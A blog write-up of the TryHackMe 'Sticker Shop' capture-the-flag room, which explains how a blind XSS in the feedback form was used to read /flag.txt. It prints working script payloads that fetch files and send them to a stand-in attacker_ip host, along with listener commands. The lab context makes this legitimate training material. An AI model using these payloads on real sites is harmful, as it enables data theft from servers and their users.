---
layout: post
title: TryHackMe - The Sticker Shop Write-Up
date: 2025-02-11
classes: wide
description: Abusing lack of sanitization to retrieve files from the remote server.
---

# The Sticker Shop

![](/assets/img/post/thm_the_sticker_shop/1.png)

## Reconnaissance

Usually I like to run a basic nmap scan to identify potential services we can abuse, but the challenge asks us to retrieve the `/flag.txt` inside the web server. So I did run nmap just as a habit, but there is absolutely no need. Instead, we'll stick to the web server itself.

![](/assets/img/post/thm_the_sticker_shop/2.png)

The page itself is a very simple one, all we can see are some cat sticker images, and a message telling us they only sell at their physical store, so we don't have a buy function, nor we can click the images to see a checkout page.

![](/assets/img/post/thm_the_sticker_shop/3.png)

We also have a customer feedback page, where we can send a personal feedback about the store. Finally, accessing the flag directly obviously won't work, as we get a 401 response.

## Reading Files Remotely

Running fuzzing tools like `dirbuster`, `ffuf`, `wfuzz` is also a waste of time, we don't have absolutely no other directories or pages beyond those we've seen. Interestingly enough, submitting a feedback gives us an important message: 

`Thanks for your feedback! It will be evaluated shortly by our staff`

This can either mean nothing, or tell us the feedback is being passed to an `eval()` function, and if that's the case, then we can try a few different things. The first one is XSS payloads, while the other options are related to the server using Python.

![](/assets/img/post/thm_the_sticker_shop/4.png)

Since the request isn't reflected, maybe we can send a request somewhere? Let's pop up a python server with `sudo python -m http.server 80` and send a basic payload to the site:

```html
<script>new Image().src="http://attacker_ip/cookie.php</script>
```

There's no need to add a `document.cookie` as the website doesn't use sessions. Now we wait...

![](/assets/img/post/thm_the_sticker_shop/5.png)

The request is being sent multiple times, probably to simulate a real user. Now we'll be sending another payload, this time our goal is to get the contents of `flag.txt` file and sending it to our server.

```html
<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://attacker_ip/log?flag=' + encodeURIComponent(data));
  });
</script>
```

And after submitting the feedback, we have our flag:

![](/assets/img/post/thm_the_sticker_shop/6.png)

Notice we have some encoded characters, those are brackets used to mark the flag. Alternatively, the following payload can be used to retrieve the flag as well:

```html
<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://attacker_ip/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'flag=' + data
    });
  });
</script>

```

What both payloads are doing is reading the contents of the flag and sending it through a request. Now if we use `sudo nc -lvp 80` to listen to the request:

![7](/assets/img/post/thm_the_sticker_shop/7.png)

So that's pretty much it, thanks for reading!